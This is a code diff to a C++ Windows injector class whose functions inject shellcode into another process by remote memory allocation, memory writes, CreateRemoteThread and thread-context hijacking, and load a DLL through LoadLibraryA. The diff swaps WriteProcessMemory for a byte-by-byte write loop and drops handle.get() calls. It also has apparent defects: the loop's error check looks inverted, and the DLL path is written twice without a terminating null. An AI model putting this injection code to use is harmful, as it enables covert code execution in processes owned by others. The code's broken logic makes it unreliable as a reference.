@@ -4,7 +4,7 @@ void injector_t::inject_shellcode_crt(const PROCESS_INFO& process_info, const st
 {
    
     // allocate memory for the shellcode
-    LPVOID allocated = VirtualAllocEx(process_info.handle.get(), NULL, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    LPVOID allocated = VirtualAllocEx(process_info.handle, NULL, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (allocated == NULL)
     {
         print_error(GetLastError());
@@ -12,15 +12,17 @@ void injector_t::inject_shellcode_crt(const PROCESS_INFO& process_info, const st
     }
 
     // injecting the shellcode into the process
-    SIZE_T bytes_written;
-    if (!WriteProcessMemory(process_info.handle.get(), allocated, &shellcode[0], shellcode.size(), &bytes_written))
+    for (size_t i = 0; i < shellcode.size(); ++i)
     {
-        print_error(GetLastError());
-        return;
+        if (write_memory<BYTE>(process_info.handle, reinterpret_cast<LPVOID>(reinterpret_cast<char*>(allocated) + i), shellcode[i]))
+        {
+            print_error(GetLastError());
+            return;
+        }
     }
 
     // execute the shellcode
-    HANDLE thread = CreateRemoteThread(process_info.handle.get(), NULL, NULL, (LPTHREAD_START_ROUTINE)allocated, NULL, NULL, NULL);
+    HANDLE thread = CreateRemoteThread(process_info.handle, NULL, NULL, (LPTHREAD_START_ROUTINE)allocated, NULL, NULL, NULL);
     if (thread == NULL)
     {
         print_error(GetLastError());
@@ -30,7 +32,7 @@ void injector_t::inject_shellcode_crt(const PROCESS_INFO& process_info, const st
     CloseHandle(thread);
 
     // free the allocated memory
-    if (!VirtualFreeEx(process_info.handle.get(), allocated, 0, MEM_RELEASE))
+    if (!VirtualFreeEx(process_info.handle, allocated, 0, MEM_RELEASE))
     {
         print_error(GetLastError());
         return;
@@ -82,7 +84,7 @@ void injector_t::inject_shellcode_mth_x64(const PROCESS_INFO& process_info, std:
     }
 
     // allocate memory for the shellcode
-    LPVOID allocated = VirtualAllocEx(process_info.handle.get(), NULL, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    LPVOID allocated = VirtualAllocEx(process_info.handle, NULL, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (allocated == NULL)
     {
         print_error(GetLastError());
@@ -90,11 +92,13 @@ void injector_t::inject_shellcode_mth_x64(const PROCESS_INFO& process_info, std:
     }
 
     // injecting the shellcode into the process
-    SIZE_T bytes_written;
-    if (!WriteProcessMemory(process_info.handle.get(), allocated, &shellcode[0], shellcode.size(), &bytes_written))
+    for (size_t i = 0; i < shellcode.size(); ++i)
     {
-        print_error(GetLastError());
-        return;
+        if (write_memory<BYTE>(process_info.handle, reinterpret_cast<LPVOID>(reinterpret_cast<char*>(allocated) + i), shellcode[i]))
+        {
+            print_error(GetLastError());
+            return;
+        }
     }
 
     // modify thread context to execute the shellcode
@@ -115,7 +119,7 @@ void injector_t::inject_shellcode_mth_x64(const PROCESS_INFO& process_info, std:
 
     // close the handle to main thread and free the memory
     CloseHandle(main_thread);
-    if (!VirtualFreeEx(process_info.handle.get(), allocated, 0, MEM_RELEASE))
+    if (!VirtualFreeEx(process_info.handle, allocated, 0, MEM_RELEASE))
     {
         print_error(GetLastError());
         return;
@@ -167,7 +171,7 @@ void injector_t::inject_shellcode_mth_x86(const PROCESS_INFO& process_info, std:
     }
 
     // allocate memory for the shellcode
-    LPVOID allocated = VirtualAllocEx(process_info.handle.get(), NULL, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    LPVOID allocated = VirtualAllocEx(process_info.handle, NULL, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (allocated == NULL)
     {
         print_error(GetLastError());
@@ -175,11 +179,13 @@ void injector_t::inject_shellcode_mth_x86(const PROCESS_INFO& process_info, std:
     }
 
     // injecting the shellcode into the process
-    SIZE_T bytes_written;
-    if (!WriteProcessMemory(process_info.handle.get(), allocated, &shellcode[0], shellcode.size(), &bytes_written))
+    for (size_t i = 0; i < shellcode.size(); ++i)
     {
-        print_error(GetLastError());
-        return;
+        if (write_memory<BYTE>(process_info.handle, reinterpret_cast<LPVOID>(reinterpret_cast<char*>(allocated) + i), shellcode[i]))
+        {
+            print_error(GetLastError());
+            return;
+        }
     }
 
     // modify thread context to execute the shellcode
@@ -211,7 +217,7 @@ void injector_t::inject_dll(const PROCESS_INFO& process_info, const std::string&
 {
     
     // allocate space for the DLL name
-    LPVOID dll_name = VirtualAllocEx(process_info.handle.get(), NULL, dll_path.size(), MEM_COMMIT, PAGE_EXECUTE);
+    LPVOID dll_name = VirtualAllocEx(process_info.handle, NULL, dll_path.size(), MEM_COMMIT, PAGE_EXECUTE);
     if (dll_name == NULL)
     {
         print_error(GetLastError());
@@ -220,10 +226,20 @@ void injector_t::inject_dll(const PROCESS_INFO& process_info, const std::string&
 
     // injecting the dll name into the process
     SIZE_T bytes_written;
-    if (!WriteProcessMemory(process_info.handle.get(), dll_name, dll_path.c_str(), dll_path.size(), &bytes_written))
+    if (!WriteProcessMemory(process_info.handle, dll_name, dll_path.c_str(), dll_path.size(), &bytes_written))
     {
         print_error(GetLastError());
         return;
+    }
+
+    // injecting the shellcode into the process
+    for (size_t i = 0; i < dll_path.length(); ++i)
+    {
+        if (write_memory<BYTE>(process_info.handle, reinterpret_cast<LPVOID>(reinterpret_cast<char*>(dll_name) + i), dll_path[i]))
+        {
+            print_error(GetLastError());
+            return;
+        }
     }
 
     // find the address of LoadLibrary
@@ -231,7 +247,7 @@ void injector_t::inject_dll(const PROCESS_INFO& process_info, const std::string&
     LPVOID addr = GetProcAddress(k32, "LoadLibraryA");
 
     // execute the shellcode
-    HANDLE thread = CreateRemoteThread(process_info.handle.get(), NULL, NULL, (LPTHREAD_START_ROUTINE)addr, dll_name, NULL, NULL);
+    HANDLE thread = CreateRemoteThread(process_info.handle, NULL, NULL, (LPTHREAD_START_ROUTINE)addr, dll_name, NULL, NULL);
     if (thread == NULL)
     {
         print_error(GetLastError());
